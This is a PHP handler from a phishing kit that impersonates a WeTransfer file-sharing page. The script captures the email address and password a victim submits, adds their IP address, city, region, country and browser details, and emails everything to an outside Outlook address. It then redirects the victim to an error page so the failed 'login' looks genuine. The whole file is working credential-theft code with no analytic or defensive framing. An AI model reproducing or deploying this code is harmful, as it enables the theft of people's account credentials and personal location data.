<?php


$email = "".$_POST['email']."";
$domain_name = substr(strrchr($email, "@"), 1);
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
$date = gmdate ("Y-n-d");
$time = gmdate ("H:i:s");
$browser = $_SERVER['HTTP_USER_AGENT'];
header("Location: error.php?email=$email");
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "============= [ip] =============\n";
header("Location: error.php?email=$email");
$message .= 	"IP2: {$geoplugin->ip}\n";
$message .= 	"City: {$geoplugin->city}\n";
$message .= 	"Region: {$geoplugin->region}\n";
$message .= 	"Country Name: {$geoplugin->countryName}\n";
$message .= 	"Country Code: {$geoplugin->countryCode}\n";
$message .= 	"User-Agent: ".$browser."\n";
$message.= "Date Log  : ".$date."\n";
$message.= "Time Log  : ".$time."\n";


$domain = 'WE TRANSFER Logs';
$subj = "WE TRANSFER ATTACHMENT! ".$_POST['email']."";
$from = "From: $domain<west>\n";
mail("op1lkt55@outlook.com",$subj,$message,$from,$domain);

header("Location: error.php?email=$email");